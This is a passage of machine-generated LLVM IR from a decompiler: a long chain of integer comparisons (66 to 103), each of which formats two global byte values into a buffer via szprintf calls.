  %v3_b544 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b550 = sext i8 %v3_b538 to i32
  %v6_b550 = sext i8 %v3_b544 to i32
  %v8_b550 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fcf4.200 to i32), i32 %v4_b550, i32 %v6_b550, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b52c
  %v7_b558 = icmp eq i32 %v2_a7e0, 66
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b588

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v3_b56c = load i8, i8* @global_var_2e471.71, align 1
  %v3_b578 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b584 = sext i8 %v3_b56c to i32
  %v6_b584 = sext i8 %v3_b578 to i32
  %v8_b584 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd04.202 to i32), i32 %v4_b584, i32 %v6_b584, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b588

dec_label_pc_b588:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b560
  %v7_b58c = icmp eq i32 %v2_a7e0, 67
  br i1 %v7_b58c, label %dec_label_pc_b594, label %dec_label_pc_b5bc

dec_label_pc_b594:                                ; preds = %dec_label_pc_b588
  %v3_b5a0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b5ac = load i8, i8* @global_var_2e472.72, align 1
  %v4_b5b8 = sext i8 %v3_b5a0 to i32
  %v6_b5b8 = sext i8 %v3_b5ac to i32
  %v8_b5b8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd14.204 to i32), i32 %v4_b5b8, i32 %v6_b5b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b588, %dec_label_pc_b594
  %v7_b5c0 = icmp eq i32 %v2_a7e0, 68
  br i1 %v7_b5c0, label %dec_label_pc_b5c8, label %dec_label_pc_b5f0

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b5bc
  %v3_b5d4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b5e0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b5ec = sext i8 %v3_b5d4 to i32
  %v6_b5ec = sext i8 %v3_b5e0 to i32
  %v8_b5ec = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd24.206 to i32), i32 %v4_b5ec, i32 %v6_b5ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f0

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b5bc, %dec_label_pc_b5c8
  %v7_b5f4 = icmp eq i32 %v2_a7e0, 69
  br i1 %v7_b5f4, label %dec_label_pc_b5fc, label %dec_label_pc_b624

dec_label_pc_b5fc:                                ; preds = %dec_label_pc_b5f0
  %v3_b608 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b614 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b620 = sext i8 %v3_b608 to i32
  %v6_b620 = sext i8 %v3_b614 to i32
  %v8_b620 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd34.208 to i32), i32 %v4_b620, i32 %v6_b620, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b624

dec_label_pc_b624:                                ; preds = %dec_label_pc_b5f0, %dec_label_pc_b5fc
  %v7_b628 = icmp eq i32 %v2_a7e0, 70
  br i1 %v7_b628, label %dec_label_pc_b630, label %dec_label_pc_b658

dec_label_pc_b630:                                ; preds = %dec_label_pc_b624
  %v3_b63c = load i8, i8* @global_var_2e471.71, align 1
  %v3_b648 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b654 = sext i8 %v3_b63c to i32
  %v6_b654 = sext i8 %v3_b648 to i32
  %v8_b654 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd44.210 to i32), i32 %v4_b654, i32 %v6_b654, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b658

dec_label_pc_b658:                                ; preds = %dec_label_pc_b624, %dec_label_pc_b630
  %v7_b65c = icmp eq i32 %v2_a7e0, 71
  br i1 %v7_b65c, label %dec_label_pc_b664, label %dec_label_pc_b68c

dec_label_pc_b664:                                ; preds = %dec_label_pc_b658
  %v3_b670 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b67c = load i8, i8* @global_var_2e472.72, align 1
  %v4_b688 = sext i8 %v3_b670 to i32
  %v6_b688 = sext i8 %v3_b67c to i32
  %v8_b688 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd54.212 to i32), i32 %v4_b688, i32 %v6_b688, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b658, %dec_label_pc_b664
  %v7_b690 = icmp eq i32 %v2_a7e0, 72
  br i1 %v7_b690, label %dec_label_pc_b698, label %dec_label_pc_b6c0

dec_label_pc_b698:                                ; preds = %dec_label_pc_b68c
  %v3_b6a4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b6b0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b6bc = sext i8 %v3_b6a4 to i32
  %v6_b6bc = sext i8 %v3_b6b0 to i32
  %v8_b6bc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd64.214 to i32), i32 %v4_b6bc, i32 %v6_b6bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b68c, %dec_label_pc_b698
  %v7_b6c4 = icmp eq i32 %v2_a7e0, 73
  br i1 %v7_b6c4, label %dec_label_pc_b6cc, label %dec_label_pc_b944

dec_label_pc_b6cc:                                ; preds = %dec_label_pc_b6c0
  %v3_b6d8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b6e4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b940 = sext i8 %v3_b6d8 to i32
  %v6_b940 = sext i8 %v3_b6e4 to i32
  %v8_b940 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd74.216 to i32), i32 %v4_b940, i32 %v6_b940, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b944

dec_label_pc_b944:                                ; preds = %dec_label_pc_b6c0, %dec_label_pc_b6cc
  %v7_b948 = icmp eq i32 %v2_a7e0, 74
  br i1 %v7_b948, label %dec_label_pc_b950, label %dec_label_pc_b978

dec_label_pc_b950:                                ; preds = %dec_label_pc_b944
  %v3_b95c = load i8, i8* @global_var_2e471.71, align 1
  %v3_b968 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b974 = sext i8 %v3_b95c to i32
  %v6_b974 = sext i8 %v3_b968 to i32
  %v8_b974 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd84.218 to i32), i32 %v4_b974, i32 %v6_b974, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b978

dec_label_pc_b978:                                ; preds = %dec_label_pc_b944, %dec_label_pc_b950
  %v7_b97c = icmp eq i32 %v2_a7e0, 75
  br i1 %v7_b97c, label %dec_label_pc_b984, label %dec_label_pc_b9ac

dec_label_pc_b984:                                ; preds = %dec_label_pc_b978
  %v3_b990 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b99c = load i8, i8* @global_var_2e472.72, align 1
  %v4_b9a8 = sext i8 %v3_b990 to i32
  %v6_b9a8 = sext i8 %v3_b99c to i32
  %v8_b9a8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fd94.221 to i32), i32 %v4_b9a8, i32 %v6_b9a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b978, %dec_label_pc_b984
  %v7_b9b0 = icmp eq i32 %v2_a7e0, 76
  br i1 %v7_b9b0, label %dec_label_pc_b9b8, label %dec_label_pc_b9e0

dec_label_pc_b9b8:                                ; preds = %dec_label_pc_b9ac
  %v3_b9c4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_b9d0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_b9dc = sext i8 %v3_b9c4 to i32
  %v6_b9dc = sext i8 %v3_b9d0 to i32
  %v8_b9dc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fda4.223 to i32), i32 %v4_b9dc, i32 %v6_b9dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9e0

dec_label_pc_b9e0:                                ; preds = %dec_label_pc_b9ac, %dec_label_pc_b9b8
  %v7_b9e4 = icmp eq i32 %v2_a7e0, 77
  br i1 %v7_b9e4, label %dec_label_pc_b9ec, label %dec_label_pc_ba14

dec_label_pc_b9ec:                                ; preds = %dec_label_pc_b9e0
  %v3_b9f8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ba04 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ba10 = sext i8 %v3_b9f8 to i32
  %v6_ba10 = sext i8 %v3_ba04 to i32
  %v8_ba10 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fdb4.225 to i32), i32 %v4_ba10, i32 %v6_ba10, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba14

dec_label_pc_ba14:                                ; preds = %dec_label_pc_b9e0, %dec_label_pc_b9ec
  %v7_ba18 = icmp eq i32 %v2_a7e0, 78
  br i1 %v7_ba18, label %dec_label_pc_ba20, label %dec_label_pc_ba48

dec_label_pc_ba20:                                ; preds = %dec_label_pc_ba14
  %v3_ba2c = load i8, i8* @global_var_2e471.71, align 1
  %v3_ba38 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ba44 = sext i8 %v3_ba2c to i32
  %v6_ba44 = sext i8 %v3_ba38 to i32
  %v8_ba44 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fdc4.227 to i32), i32 %v4_ba44, i32 %v6_ba44, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba48

dec_label_pc_ba48:                                ; preds = %dec_label_pc_ba14, %dec_label_pc_ba20
  %v7_ba4c = icmp eq i32 %v2_a7e0, 79
  br i1 %v7_ba4c, label %dec_label_pc_ba54, label %dec_label_pc_ba7c

dec_label_pc_ba54:                                ; preds = %dec_label_pc_ba48
  %v3_ba60 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ba6c = load i8, i8* @global_var_2e472.72, align 1
  %v4_ba78 = sext i8 %v3_ba60 to i32
  %v6_ba78 = sext i8 %v3_ba6c to i32
  %v8_ba78 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fdd4.229 to i32), i32 %v4_ba78, i32 %v6_ba78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba7c

dec_label_pc_ba7c:                                ; preds = %dec_label_pc_ba48, %dec_label_pc_ba54
  %v7_ba80 = icmp eq i32 %v2_a7e0, 80
  br i1 %v7_ba80, label %dec_label_pc_ba88, label %dec_label_pc_bab0

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba7c
  %v3_ba94 = load i8, i8* @global_var_2e471.71, align 1
  %v3_baa0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_baac = sext i8 %v3_ba94 to i32
  %v6_baac = sext i8 %v3_baa0 to i32
  %v8_baac = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fde4.231 to i32), i32 %v4_baac, i32 %v6_baac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab0

dec_label_pc_bab0:                                ; preds = %dec_label_pc_ba7c, %dec_label_pc_ba88
  %v7_bab4 = icmp eq i32 %v2_a7e0, 81
  br i1 %v7_bab4, label %dec_label_pc_babc, label %dec_label_pc_bae4

dec_label_pc_babc:                                ; preds = %dec_label_pc_bab0
  %v3_bac8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bad4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bae0 = sext i8 %v3_bac8 to i32
  %v6_bae0 = sext i8 %v3_bad4 to i32
  %v8_bae0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fdf4.233 to i32), i32 %v4_bae0, i32 %v6_bae0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %dec_label_pc_bab0, %dec_label_pc_babc
  %v7_bae8 = icmp eq i32 %v2_a7e0, 82
  br i1 %v7_bae8, label %dec_label_pc_baf0, label %dec_label_pc_bb18

dec_label_pc_baf0:                                ; preds = %dec_label_pc_bae4
  %v3_bafc = load i8, i8* @global_var_2e471.71, align 1
  %v3_bb08 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bb14 = sext i8 %v3_bafc to i32
  %v6_bb14 = sext i8 %v3_bb08 to i32
  %v8_bb14 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe04.235 to i32), i32 %v4_bb14, i32 %v6_bb14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb18

dec_label_pc_bb18:                                ; preds = %dec_label_pc_bae4, %dec_label_pc_baf0
  %v7_bb1c = icmp eq i32 %v2_a7e0, 83
  br i1 %v7_bb1c, label %dec_label_pc_bb24, label %dec_label_pc_bb4c

dec_label_pc_bb24:                                ; preds = %dec_label_pc_bb18
  %v3_bb30 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bb3c = load i8, i8* @global_var_2e472.72, align 1
  %v4_bb48 = sext i8 %v3_bb30 to i32
  %v6_bb48 = sext i8 %v3_bb3c to i32
  %v8_bb48 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe14.237 to i32), i32 %v4_bb48, i32 %v6_bb48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb4c

dec_label_pc_bb4c:                                ; preds = %dec_label_pc_bb18, %dec_label_pc_bb24
  %v7_bb50 = icmp eq i32 %v2_a7e0, 84
  br i1 %v7_bb50, label %dec_label_pc_bb58, label %dec_label_pc_bb80

dec_label_pc_bb58:                                ; preds = %dec_label_pc_bb4c
  %v3_bb64 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bb70 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bb7c = sext i8 %v3_bb64 to i32
  %v6_bb7c = sext i8 %v3_bb70 to i32
  %v8_bb7c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe24.239 to i32), i32 %v4_bb7c, i32 %v6_bb7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb80

dec_label_pc_bb80:                                ; preds = %dec_label_pc_bb4c, %dec_label_pc_bb58
  %v7_bb84 = icmp eq i32 %v2_a7e0, 85
  br i1 %v7_bb84, label %dec_label_pc_bb8c, label %dec_label_pc_bbb4

dec_label_pc_bb8c:                                ; preds = %dec_label_pc_bb80
  %v3_bb98 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bba4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bbb0 = sext i8 %v3_bb98 to i32
  %v6_bbb0 = sext i8 %v3_bba4 to i32
  %v8_bbb0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe34.241 to i32), i32 %v4_bbb0, i32 %v6_bbb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb4

dec_label_pc_bbb4:                                ; preds = %dec_label_pc_bb80, %dec_label_pc_bb8c
  %v7_bbb8 = icmp eq i32 %v2_a7e0, 86
  br i1 %v7_bbb8, label %dec_label_pc_bbc0, label %dec_label_pc_bbe8

dec_label_pc_bbc0:                                ; preds = %dec_label_pc_bbb4
  %v3_bbcc = load i8, i8* @global_var_2e471.71, align 1
  %v3_bbd8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bbe4 = sext i8 %v3_bbcc to i32
  %v6_bbe4 = sext i8 %v3_bbd8 to i32
  %v8_bbe4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe44.243 to i32), i32 %v4_bbe4, i32 %v6_bbe4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbe8

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bbb4, %dec_label_pc_bbc0
  %v7_bbec = icmp eq i32 %v2_a7e0, 87
  br i1 %v7_bbec, label %dec_label_pc_bbf4, label %dec_label_pc_bc1c

dec_label_pc_bbf4:                                ; preds = %dec_label_pc_bbe8
  %v3_bc00 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bc0c = load i8, i8* @global_var_2e472.72, align 1
  %v4_bc18 = sext i8 %v3_bc00 to i32
  %v6_bc18 = sext i8 %v3_bc0c to i32
  %v8_bc18 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe54.245 to i32), i32 %v4_bc18, i32 %v6_bc18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc1c

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_bbe8, %dec_label_pc_bbf4
  %v7_bc20 = icmp eq i32 %v2_a7e0, 88
  br i1 %v7_bc20, label %dec_label_pc_bc28, label %dec_label_pc_bc50

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bc1c
  %v3_bc34 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bc40 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bc4c = sext i8 %v3_bc34 to i32
  %v6_bc4c = sext i8 %v3_bc40 to i32
  %v8_bc4c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe64.247 to i32), i32 %v4_bc4c, i32 %v6_bc4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc50

dec_label_pc_bc50:                                ; preds = %dec_label_pc_bc1c, %dec_label_pc_bc28
  %v7_bc54 = icmp eq i32 %v2_a7e0, 89
  br i1 %v7_bc54, label %dec_label_pc_bc5c, label %dec_label_pc_bc84

dec_label_pc_bc5c:                                ; preds = %dec_label_pc_bc50
  %v3_bc68 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bc74 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bc80 = sext i8 %v3_bc68 to i32
  %v6_bc80 = sext i8 %v3_bc74 to i32
  %v8_bc80 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe74.249 to i32), i32 %v4_bc80, i32 %v6_bc80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc84

dec_label_pc_bc84:                                ; preds = %dec_label_pc_bc50, %dec_label_pc_bc5c
  %v7_bc88 = icmp eq i32 %v2_a7e0, 90
  br i1 %v7_bc88, label %dec_label_pc_bc90, label %dec_label_pc_bcb8

dec_label_pc_bc90:                                ; preds = %dec_label_pc_bc84
  %v3_bc9c = load i8, i8* @global_var_2e471.71, align 1
  %v3_bca8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bcb4 = sext i8 %v3_bc9c to i32
  %v6_bcb4 = sext i8 %v3_bca8 to i32
  %v8_bcb4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe84.251 to i32), i32 %v4_bcb4, i32 %v6_bcb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcb8

dec_label_pc_bcb8:                                ; preds = %dec_label_pc_bc84, %dec_label_pc_bc90
  %v7_bcbc = icmp eq i32 %v2_a7e0, 91
  br i1 %v7_bcbc, label %dec_label_pc_bcc4, label %dec_label_pc_bcec

dec_label_pc_bcc4:                                ; preds = %dec_label_pc_bcb8
  %v3_bcd0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bcdc = load i8, i8* @global_var_2e472.72, align 1
  %v4_bce8 = sext i8 %v3_bcd0 to i32
  %v6_bce8 = sext i8 %v3_bcdc to i32
  %v8_bce8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fe94.253 to i32), i32 %v4_bce8, i32 %v6_bce8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcec

dec_label_pc_bcec:                                ; preds = %dec_label_pc_bcb8, %dec_label_pc_bcc4
  %v7_bcf0 = icmp eq i32 %v2_a7e0, 92
  br i1 %v7_bcf0, label %dec_label_pc_bcf8, label %dec_label_pc_bd20

dec_label_pc_bcf8:                                ; preds = %dec_label_pc_bcec
  %v3_bd04 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bd10 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bd1c = sext i8 %v3_bd04 to i32
  %v6_bd1c = sext i8 %v3_bd10 to i32
  %v8_bd1c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fea4.255 to i32), i32 %v4_bd1c, i32 %v6_bd1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd20

dec_label_pc_bd20:                                ; preds = %dec_label_pc_bcec, %dec_label_pc_bcf8
  %v7_bd24 = icmp eq i32 %v2_a7e0, 93
  br i1 %v7_bd24, label %dec_label_pc_bd2c, label %dec_label_pc_bd54

dec_label_pc_bd2c:                                ; preds = %dec_label_pc_bd20
  %v3_bd38 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bd44 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bd50 = sext i8 %v3_bd38 to i32
  %v6_bd50 = sext i8 %v3_bd44 to i32
  %v8_bd50 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1feb4.257 to i32), i32 %v4_bd50, i32 %v6_bd50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %dec_label_pc_bd20, %dec_label_pc_bd2c
  %v7_bd58 = icmp eq i32 %v2_a7e0, 94
  br i1 %v7_bd58, label %dec_label_pc_bd60, label %dec_label_pc_bd88

dec_label_pc_bd60:                                ; preds = %dec_label_pc_bd54
  %v3_bd6c = load i8, i8* @global_var_2e471.71, align 1
  %v3_bd78 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bd84 = sext i8 %v3_bd6c to i32
  %v6_bd84 = sext i8 %v3_bd78 to i32
  %v8_bd84 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fb94.156 to i32), i32 %v4_bd84, i32 %v6_bd84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd88

dec_label_pc_bd88:                                ; preds = %dec_label_pc_bd54, %dec_label_pc_bd60
  %v7_bd8c = icmp eq i32 %v2_a7e0, 95
  br i1 %v7_bd8c, label %dec_label_pc_bd94, label %dec_label_pc_bdbc

dec_label_pc_bd94:                                ; preds = %dec_label_pc_bd88
  %v3_bda0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bdac = load i8, i8* @global_var_2e472.72, align 1
  %v4_bdb8 = sext i8 %v3_bda0 to i32
  %v6_bdb8 = sext i8 %v3_bdac to i32
  %v8_bdb8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fec4.259 to i32), i32 %v4_bdb8, i32 %v6_bdb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdbc

dec_label_pc_bdbc:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bd94
  %v7_bdc0 = icmp eq i32 %v2_a7e0, 96
  br i1 %v7_bdc0, label %dec_label_pc_bdc8, label %dec_label_pc_bdf0

dec_label_pc_bdc8:                                ; preds = %dec_label_pc_bdbc
  %v3_bdd4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bde0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bdec = sext i8 %v3_bdd4 to i32
  %v6_bdec = sext i8 %v3_bde0 to i32
  %v8_bdec = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fbc4.162 to i32), i32 %v4_bdec, i32 %v6_bdec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_bdbc, %dec_label_pc_bdc8
  %v7_bdf4 = icmp eq i32 %v2_a7e0, 97
  br i1 %v7_bdf4, label %dec_label_pc_bdfc, label %dec_label_pc_be24

dec_label_pc_bdfc:                                ; preds = %dec_label_pc_bdf0
  %v3_be08 = load i8, i8* @global_var_2e471.71, align 1
  %v3_be14 = load i8, i8* @global_var_2e472.72, align 1
  %v4_be20 = sext i8 %v3_be08 to i32
  %v6_be20 = sext i8 %v3_be14 to i32
  %v8_be20 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fed4.261 to i32), i32 %v4_be20, i32 %v6_be20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be24

dec_label_pc_be24:                                ; preds = %dec_label_pc_bdf0, %dec_label_pc_bdfc
  %v7_be28 = icmp eq i32 %v2_a7e0, 98
  br i1 %v7_be28, label %dec_label_pc_be30, label %dec_label_pc_be58

dec_label_pc_be30:                                ; preds = %dec_label_pc_be24
  %v3_be3c = load i8, i8* @global_var_2e471.71, align 1
  %v3_be48 = load i8, i8* @global_var_2e472.72, align 1
  %v4_be54 = sext i8 %v3_be3c to i32
  %v6_be54 = sext i8 %v3_be48 to i32
  %v8_be54 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fee4.263 to i32), i32 %v4_be54, i32 %v6_be54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be58

dec_label_pc_be58:                                ; preds = %dec_label_pc_be24, %dec_label_pc_be30
  %v7_be5c = icmp eq i32 %v2_a7e0, 99
  br i1 %v7_be5c, label %dec_label_pc_be64, label %dec_label_pc_be8c

dec_label_pc_be64:                                ; preds = %dec_label_pc_be58
  %v3_be70 = load i8, i8* @global_var_2e471.71, align 1
  %v3_be7c = load i8, i8* @global_var_2e472.72, align 1
  %v4_be88 = sext i8 %v3_be70 to i32
  %v6_be88 = sext i8 %v3_be7c to i32
  %v8_be88 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fef4.265 to i32), i32 %v4_be88, i32 %v6_be88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be8c

dec_label_pc_be8c:                                ; preds = %dec_label_pc_be58, %dec_label_pc_be64
  %v7_be90 = icmp eq i32 %v2_a7e0, 100
  br i1 %v7_be90, label %dec_label_pc_be98, label %dec_label_pc_bec0

dec_label_pc_be98:                                ; preds = %dec_label_pc_be8c
  %v3_bea4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_beb0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bebc = sext i8 %v3_bea4 to i32
  %v6_bebc = sext i8 %v3_beb0 to i32
  %v8_bebc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff04.267 to i32), i32 %v4_bebc, i32 %v6_bebc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bec0

dec_label_pc_bec0:                                ; preds = %dec_label_pc_be8c, %dec_label_pc_be98
  %v7_bec4 = icmp eq i32 %v2_a7e0, 101
  br i1 %v7_bec4, label %dec_label_pc_becc, label %dec_label_pc_bef4

dec_label_pc_becc:                                ; preds = %dec_label_pc_bec0
  %v3_bed8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bee4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bef0 = sext i8 %v3_bed8 to i32
  %v6_bef0 = sext i8 %v3_bee4 to i32
  %v8_bef0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1ff14.269 to i32), i32 %v4_bef0, i32 %v6_bef0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef4

dec_label_pc_bef4:                                ; preds = %dec_label_pc_bec0, %dec_label_pc_becc
  %v7_bef8 = icmp eq i32 %v2_a7e0, 102
  br i1 %v7_bef8, label %dec_label_pc_bf00, label %dec_label_pc_bf28

dec_label_pc_bf00:                                ; preds = %dec_label_pc_bef4
  %v3_bf0c = load i8, i8* @global_var_2e471.71, align 1
  %v3_bf18 = load i8, i8* @global_var_2e472.72, align 1
  %v4_bf24 = sext i8 %v3_bf0c to i32
  %v6_bf24 = sext i8 %v3_bf18 to i32
  %v8_bf24 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1ff24.271 to i32), i32 %v4_bf24, i32 %v6_bf24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf28

dec_label_pc_bf28:                                ; preds = %dec_label_pc_bef4, %dec_label_pc_bf00
  %v7_bf2c = icmp eq i32 %v2_a7e0, 103
  br i1 %v7_bf2c, label %dec_label_pc_bf34, label %dec_label_pc_bf5c

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bf28
  %v3_bf40 = load i8, i8* @global_var_2e471.71, align 1
  %v3_bf4c = load i8, i8* @global_var_2e472.72, align 1
  %v4_bf58 = sext i8 %v3_bf40 to i32
  %v6_bf58 = sext i8 %v3_bf4c to i32
